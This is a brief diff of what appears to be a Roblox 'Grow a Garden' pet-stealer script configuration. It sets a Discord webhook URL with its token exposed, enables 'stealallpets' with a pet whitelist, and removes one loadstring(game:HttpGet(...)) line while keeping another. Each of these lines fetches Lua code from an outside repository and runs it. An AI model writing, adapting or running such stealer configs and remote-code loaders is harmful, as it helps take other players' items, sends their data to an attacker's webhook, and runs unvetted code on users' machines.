@@ -9,6 +9,4 @@ webhook = "https://discord.com/api/webhooks/1397737960925036605/6OL-UU-x_pYYOauE
 stealallpets = true
 Whitelist_Pets = {"Red Fox", "Raccoon", "Dragonfly"}
 
-loadstring(game:HttpGet("https://codeberg.org/amaz/main/raw/branch/main/gag"))()
-
 loadstring(game:HttpGet("https://raw.githubusercontent.com/thatboyskulls12/GAG-SKULLS/refs/heads/main/Source.lua"))()
